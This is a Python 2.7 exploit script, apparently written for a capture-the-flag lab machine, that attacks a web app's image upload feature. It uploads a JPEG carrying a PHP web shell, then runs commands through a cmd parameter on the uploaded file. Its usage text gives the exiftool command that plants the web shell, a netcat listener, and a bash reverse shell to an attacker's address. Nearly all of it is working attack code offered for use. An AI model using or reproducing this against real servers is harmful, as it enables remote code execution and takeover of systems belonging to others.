# Developed using Python 2.7
# Refer to Usage Instructions in main method 

import requests
import urllib
import sys

# To enable the proxy uncomment the following code
'''
proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
        }
'''

# And comment the following code
proxies = {
    'http': None,
    'https': None
}


def upload_image(ip_address,image_file):
    print("-----------------------------------------------")
    print("----------------Uploading File-----------------")
    print("-----------------------------------------------")
    url_upload = 'http://' + ip_address + '/upload.php'
    files = {
        'image': (image_file, open(image_file, 'rb'),'image/jpeg'),
        'submit': (None, 'Upload Image')
        }
    postdata = requests.post(url_upload, files=files,allow_redirects=False, proxies=proxies)
    print('File uploaded!')
    print("")

def call_image(ip_address, cmd, image_file):
    print("-----------------------------------------------")
    print("-------Calling File & Executing Payload--------")
    print("-----------------------------------------------")
    cmd_encoded = urllib.quote(cmd)
    url_call_upload = 'http://' + ip_address + '/images/uploads/' + image_file + '?cmd=' + cmd_encoded
    getdata = requests.get(url_call_upload, allow_redirects=False, proxies=proxies)
    print(getdata.text)
    print("")


def main():
    if len(sys.argv) < 4:
        print("-----------------------------------------------")
        print("-------------Usage Instructions----------------")
        print("-----------------------------------------------")
        print("The program requires three arguments: (1) Ip address (2) Malicious image file & (3) Command to run on the server.")
        print("Example Run Command: python upload.py 10.10.10.185 cat.php.jpeg ls")
        print("")
        print("--------Generate Malicious JPEG Image----------")
        print("Download a valid jpeg image and run the following command on the image to include a php web shell.")
        print("Command: exiftool -Comment='<?php system($_GET['cmd']); ?>' <image.jpeg>")
        print("Change the image extension to .php.jpeg")
        print("Then place image in the same directory as this script")
        print("")
        print("--------Commands to get Reverse Shell----------")
        print("Setup netcat listener on attack machine: nc -nlvp 443")
        print("Run script: python upload.py <target-ip> <image.php.jpeg> \"bash -c 'bash -i >& /dev/tcp/<attack-ip>/443 0>&1'\"")
        sys.exit(1)

    print("-----------------------------------------------")
    print("------------Initializing Variables-------------")
    print("-----------------------------------------------")
    ip_address = sys.argv[1]
    image_file = sys.argv[2]
    cmd = sys.argv[3]
    print ("IP address: %s" % ip_address)
    print ("Image to upload: %s" % image_file)
    print ("Command to run: %s" % cmd)
    print("")
    upload_image(ip_address, image_file)
    call_image(ip_address, cmd, image_file)

if __name__ == "__main__":
    main()
